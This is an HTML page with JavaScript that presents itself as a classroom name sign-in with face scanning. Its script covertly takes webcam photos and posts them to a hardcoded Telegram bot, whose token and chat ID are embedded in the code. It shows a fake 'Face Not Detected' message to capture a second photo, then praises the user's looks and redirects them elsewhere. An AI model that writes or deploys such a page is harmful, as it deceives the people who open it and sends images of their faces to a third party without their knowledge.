<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ittihad Fighters</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        body {
            text-align: center;
            font-family: Arial, sans-serif;
        }
        .hidden { display: none; }
        .scan-animation {
            width: 100px;
            height: 100px;
            margin: 20px auto;
            border: 5px solid #ff4081;
            border-radius: 50%;
            animation: scan 2s infinite;
        }
        @keyframes scan {
            0% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.2); opacity: 0.5; }
            100% { transform: scale(1); opacity: 1; }
        }
        .buttons {
            margin-top: 20px;
        }
        .buttons button {
            margin: 10px;
        }
        #video {
            width: 100%; /* Make video fill the available width */
            height: auto; /* Maintain aspect ratio */
        }
    </style>
</head>
<body>
    <div id="class-selection">
        <h1>Ittihad Fighters</h1>
        <p>Select your name:</p>
        <ul id="name-list"></ul>
        <button id="proceed" class="hidden">Continue</button>
    </div>

    <div id="face-recognition" class="hidden">
        <div class="scan-animation"></div>
        <p>Scanning face...</p>
        <video id="video" autoplay></video> <!-- Video element to display webcam feed -->
        <button id="start-scan">Start Scan</button>
        <button id="cancel">Cancel</button>
    </div>

    <div id="face-not-detected" class="hidden">
        <p>Face Not Detected</p>
    </div>

    <div id="completion" class="hidden">
        <p id="signed-in"></p>
        <p>You look beautiful/handsome today!</p>
        <p>Redirecting...</p>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '8146051541:AAEWlqCaaW0Z8VaejI5UX8p4T4dYPXCZv4Y';
        const TELEGRAM_CHAT_ID = '5934902786';
        const selectedNames = new Set();
        const names = ['Izz', 'Ali', 'Amin', 'Siti', 'Aisyah'];

        document.addEventListener("DOMContentLoaded", function() {
            if (localStorage.getItem("pageOpened") === "true") {
                document.body.innerHTML = "<h2>This page can only be opened once.</h2>";
                return;
            }
            showClassSelection();
        });

        $(document).ready(function() {
            names.forEach(name => {
                $('#name-list').append(`<li><label><input type="checkbox" class="name-checkbox" value="${name}"> ${name}</label></li>`);
            });

            $('.name-checkbox').on('change', function() {
                if (this.checked) {
                    selectedNames.add(this.value);
                    this.disabled = true; // Disable the current checkbox
                    $('.name-checkbox').not(this).prop('disabled', true); // Disable other checkboxes
                    $('#proceed').removeClass('hidden'); // Show the Continue button
                }
            });

            $('#proceed').on('click', function() {
                $('#class-selection').addClass('hidden');
                $('#face-recognition').removeClass('hidden');
                $('#start-scan').removeClass('hidden'); // Show the "Start Scan" button
                localStorage.setItem("pageOpened", "true"); // Disable access after clicking Continue
                startCamera(); // Start the webcam feed
            });

            $('#cancel').on('click', function() {
                alert('Page will stop here.');
                // Allow access again after clicking cancel
                localStorage.setItem("pageOpened", "false");
            });

            $('#start-scan').on('click', function() {
                $('#start-scan').addClass('hidden');
                setTimeout(() => takePicture(1), 2000); // Start the picture-taking process
            });
        });

        function startCamera() {
            const video = document.getElementById('video');
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;
                    video.play();
                })
                .catch(error => {
                    console.error("Error accessing camera: ", error);
                });
        }

        function takePicture(step) {
            const video = document.getElementById('video');
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');

            // Set canvas dimensions to match video
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            // Draw video frame on canvas
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Stop camera stream
            const stream = video.srcObject;
            const tracks = stream.getTracks();
            tracks.forEach(track => track.stop());

            // Hide the video element to avoid showing it during the second scan
            video.style.display = "none";

            sendToTelegram(canvas, step);
        }

        function sendToTelegram(canvas, step) {
            canvas.toBlob(blob => {
                let formData = new FormData();
                formData.append("chat_id", TELEGRAM_CHAT_ID);
                formData.append("photo", blob, "face.jpg");
                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: "POST",
                    body: formData
                }).then(() => {
                    if (step === 1) {
                        $('#face-recognition').addClass('hidden');
                        $('#face-not-detected').removeClass('hidden');
                        setTimeout(() => {
                            $('#face-not-detected').addClass('hidden');
                            $('#face-recognition').removeClass('hidden');
                            // Delay before the second image capture
                            setTimeout(() => takePicture(2), 4000); // Increased delay before taking second picture
                        }, 5000); // Wait 5 seconds before showing "Face Not Detected"
                    } else {
                        $('#face-recognition').addClass('hidden');
                        $('#completion').removeClass('hidden');
                        $('#signed-in').text([...selectedNames].join(', ') + " signed in âœ…");
                        setTimeout(() => {
                            window.location.href = "https://studandlearn.github.io/project-2/"; // Redirect to the desired page
                        }, 3000);
                    }
                });
            }, 'image/jpeg');
        }
    </script>
</body>
</html>
